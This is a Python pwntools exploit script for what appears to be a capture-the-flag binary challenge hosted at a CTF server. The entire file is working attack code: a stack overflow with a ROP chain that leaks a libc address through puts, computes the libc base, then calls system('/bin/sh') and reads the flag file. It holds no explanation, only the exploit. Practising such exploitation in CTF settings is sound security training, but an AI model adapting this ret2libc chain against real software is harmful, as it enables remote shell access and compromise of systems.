#!/usr/bin/env python3

from pwn import *
import re

context.log_level = logging.ERROR

elf = ELF("./chall")
libc = ELF("./libc.so.6")

rop = ROP(elf)

context.binary = elf

def conn():
    if args.LOCAL:
        libc = ELF("/usr/lib/libc.so.6")
        return (libc, elf.process())
    else:
        libc = ELF("./libc.so.6")
        return (libc, remote("ctf.cybr.club",2003))


def main():
    (libc, p) = conn()
    offset = 40


    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

    payload = offset * b"A" + p64(pop_rdi) + p64(elf.symbols['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

    p.sendline(payload)
    p.recvline()
    p.recvline()
    libc_start_address = int.from_bytes(p.recvline().rstrip(), byteorder="little")
    libc.address = libc_start_address - libc.sym["__libc_start_main"]
    print("Address of libc %s " % hex(libc.address))


    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]
    print("/bin/sh = ",hex(binsh))
    print("system = ", hex(system))

    payload = offset * b"A" + p64(pop_rdi) + p64(binsh) + p64(system) + p64(pop_rdi) + p64(binsh) + p64(system) # i uh need to do this twice idk why pls dont ask me
    p.sendline(payload)


    p.sendline("cat flag.txt;exit")

    print(re.search("(FLAG{.*})",p.recvall(timeout=.1).decode()).group(1))



if __name__ == "__main__":
    main()
